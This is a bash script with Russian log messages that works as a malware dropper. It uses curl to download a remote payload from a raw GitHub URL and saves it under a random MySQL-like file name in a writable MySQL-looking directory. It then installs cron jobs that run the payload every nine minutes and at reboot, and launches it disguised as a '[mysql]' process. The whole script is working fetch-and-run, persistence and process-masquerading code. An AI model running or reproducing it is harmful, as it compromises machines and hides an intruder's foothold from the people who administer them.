GITHUB_SCRIPT_URL="https://raw.githubusercontent.com/himlkoita/test/refs/heads/main/trust_me_bro_img_msql.sh"
MYSQL_DIRS=("/tmp/mysql" "/var/tmp/mysql" "/dev/shm/mysql" "/run/mysql" "/var/lib/mysql")

generate_name() {
    PREFIXES=("ibdata" "ib_logfile" "mysql-bin" "undo" "redo" "ibtmp" "binlog" "relay-log" "mysql" "innodb")
    RANDOM_INDEX=$((RANDOM % ${#PREFIXES[@]}))
    RANDOM_PREFIX=${PREFIXES[$RANDOM_INDEX]}
    RANDOM_NUMBER=$((RANDOM % 10000))
    echo "$RANDOM_PREFIX$RANDOM_NUMBER"
}

find_dir() {
    for dir in "${MYSQL_DIRS[@]}"; do
        mkdir -p "$dir" 2>/dev/null
        if [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    mkdir -p "/tmp/mysql" 2>/dev/null
    echo "/tmp/mysql"
}

process() {
    exec -a "[mysql]" "$SCRIPT_PATH" 2>/dev/null &
    echo "[!] Запущен ложный процесс с именем: [mysql] (PID: $!)"
    echo "[!] Путь к скрипту: $SCRIPT_PATH"
}

main() {
    MYSQL_DIR=$(find_dir)
    RANDOM_NAME=$(generate_name)
    SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
    
    echo "[+] Выбрана директория: $MYSQL_DIR"
    echo "[+] Сгенерировано имя: $RANDOM_NAME"

    if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
        echo "[*] Скачивание скрипта из: $GITHUB_SCRIPT_URL"
        curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
        echo "[*] Скрипт сохранен в: $SCRIPT_PATH"

        (crontab -l 2>/dev/null
        echo "*/9 * * * * $SCRIPT_PATH >/dev/null 2>&1"
        echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
        ) | crontab -
        echo "[*] Задачи cron добавлены для автоматического запуска"
    else
        echo "[+] Скрипт уже существует в cron"
    fi

    process
}

main
